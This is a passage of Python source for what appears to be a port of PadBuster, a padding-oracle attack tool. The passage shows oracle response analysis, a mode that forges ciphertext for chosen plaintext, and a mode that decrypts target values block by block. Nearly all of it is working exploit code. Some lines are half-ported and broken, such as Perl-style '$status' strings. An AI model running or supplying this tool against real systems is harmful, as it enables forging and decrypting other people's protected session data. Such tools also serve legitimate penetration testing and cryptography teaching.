                    signatureData = str(status) + "\t" +str(contentLength)+"\t"+location
                    if args.useBody:
                        signatureData = str(status) + "\t" + str(contentLength) + "\t" + location + "\t" + content

                    if globals()['oracleSignature']:

                        if b == 0:
                            myPrint("[+] Starting response analysis...\n", 0)

                        globals()['oracleGuesses'][signatureData] += 1
                        globals()['responseFileBuffer'][signatureData] = "Status:" + str(status) + "\nLocation:" + location + "\nContent-Length:" + str(contentLength) + "\nContent:\n" + content
                        if b == 255:
                            myPrint("*** Response Analysis Complete ***\n", 0)
                            determineSignature()
                            myPrintStats = 1
                            timeTracker = 0
                            globals()['requestTracker'] = 0
                            repeat = 1
                            bfAttempts = 0

                    if globals()['oracleSignature'] != "" and globals()['oracleSignature'] != signatureData:
                        myPrint("\nAttempt $bfAttempts - Status: $status - Content Length: $contentLength\n$testUrl\n", 0)
                        writeFile("Brute_Force_Attempt_" + str(bfAttempts) + ".txt", "URL: " + testUrl + "\nPost Data:" + testPost + "\nCookies:" \
                                  + testCookies + "\n\nStatus: " + status + "\nLocation: " + location + "\nContent-Length: "\
                                  + contentLength + "\nContent:\n" + str(content))

            if repeat == 1:
                complete = 0
            else:
                complete = 1
elif args.plainTextInput:
    # ENCRYPT MODE
    myPrint("INFO: Starting PadBuster Encrypt Mode", 0)

    # The block count will be the plaintext divided by blocksize (rounded up)
    blockCount = int(((len(args.plainTextInput)+1)/args.blockSize)+0.99)
    myPrint("[+] Number of Blocks: " + str(blockCount) + "\n", 0)

    padCount = (args.blockSize * blockCount) - len(args.plainTextInput)
    args.plainTextInput += chr(padCount) * padCount

    # SampleBytes is the encrypted text you want to derive intermediate values for, so
    # copy the current ciphertext block into sampleBytes
    # Note, nulls are used if not provided and the intermediate values are brute forced

    if args.cipherInput:
        forgedBytes = FnDecode(args.cipherInput,1)
    else:
        forgedBytes = bytes(args.blockSize)

    sampleBytes = forgedBytes
    for blockNum in range(blockCount, 0, -1):

        # IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored
        if args.intermediaryInput and blockNum == blockCount:
            intermediaryBytes = FnDecode(args.intermediaryInput, 2)
        else:
            intermediaryBytes = processBlock(sampleBytes)

        # Now XOR the intermediate bytes with the corresponding bytes from the plain-text block
        # This will become the next ciphertext block (or IV if the last one)
        if args.superVerbose:
            myPrint("[+] intermediaryBytes: " + str(intermediaryBytes) + "\n", 0)

        sampleBytes = byte_xor(intermediaryBytes, args.plainTextInput[((blockNum-1) * args.blockSize):\
                                                                      (((blockNum-1) * args.blockSize) + args.blockSize)].encode() )
        forgedBytes = sampleBytes + forgedBytes

        myPrint("\nBlock " + str(blockNum) + " Results:", 0)
        myPrint("[+] New Cipher Text (HEX): " + FnEncode(sampleBytes, 1), 0)
        myPrint("[+] Intermediate Bytes (HEX): " + FnEncode(intermediaryBytes, 1) + "\n", 0)
    forgedBytes = FnEncode(forgedBytes, args.encoding)
    forgedBytes.replace('\n', '')
else:
    # DECRYPT MODE
    myPrint("INFO: Starting PadBuster Decrypt Mode",0)
    if args.resumeBlock:
        myPrint("INFO: Resuming previous exploit at Block resumeBlock\n",0)
    else:
        resumeBlock = 1

    # Assume that the IV is included in our sample and that the first block is the IV
    for blockNum in range(resumeBlock + 1, blockCount+1, 1):
        # Since the IV is the first block, our block count is artificially inflated by one
        myPrint("*** Starting Block " + str((blockNum-1)) + " of " + str((blockCount-1)) + " ***\n",0)

        # SampleBytes is the encrypted text you want to break, so
        # lets copy the current ciphertext block into sampleBytes
        sampleBytes = encryptedBytes[(blockNum * args.blockSize - args.blockSize):\
                                     (blockNum * args.blockSize - args.blockSize) + args.blockSize]

        if args.superVerbose:
            myPrint("sampleBytes:" + str(sampleBytes), 0)
            myPrint("length of sampleBytes:" + str(len(sampleBytes)), 0)

        # IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored

        intermediaryBytes = bytearray()
        intermediaryBytes = processBlock(sampleBytes)

        # DecryptedBytes is where the decrypted block is stored
        decryptedBytes = ""

        # Now we XOR the decrypted byte with the corresponding byte from the previous block
        # (or IV if we are in the first block) to get the actual plain-text
        if args.superVerbose:
            myPrint("intermediaryBytes:" + str(intermediaryBytes),0)
            myPrint("encryptedBytes:" + str(encryptedBytes[((blockNum - 2) * args.blockSize): args.blockSize]),0)

        if blockNum == 2:
            decryptedBytes = byte_xor(intermediaryBytes, ivBytes)
        else:
            decryptedBytes = byte_xor(intermediaryBytes, encryptedBytes[((blockNum - 2) * args.blockSize):\
                                                                     ((blockNum - 2) * args.blockSize) + args.blockSize])

        myPrint("\nBlock " + str((blockNum-1)) + " Results:",0)
        myPrint("[+] Cipher Text (HEX): " + binascii.hexlify(sampleBytes).decode(),0)
        myPrint("[+] Intermediate Bytes (HEX): " + binascii.hexlify(intermediaryBytes).decode(),0)
        myPrint("[+] Plain Text: " + decryptedBytes.decode() + "\n",0)

        plainTextBytes = plainTextBytes + decryptedBytes

myPrint("-------------------------------------------------------",0)
myPrint("** Finished at " + str(datetime.datetime.now().strftime("%d%b%Y %H:%M:%S")) + "***\n", 0)

if args.plainTextInput:
    myPrint("[+] Encrypted value is: " + str(urllib.parse.quote(forgedBytes)), 0)
else:
    myPrint("[+] Decrypted value (ASCII): " + plainTextBytes.decode() + "\n",0)
    myPrint("[+] Decrypted value (HEX): " + FnEncode(plainTextBytes, 2) + "\n", 0)
    myPrint("[+] Decrypted value (Base64): " + FnEncode(plainTextBytes, 0) + "\n", 0)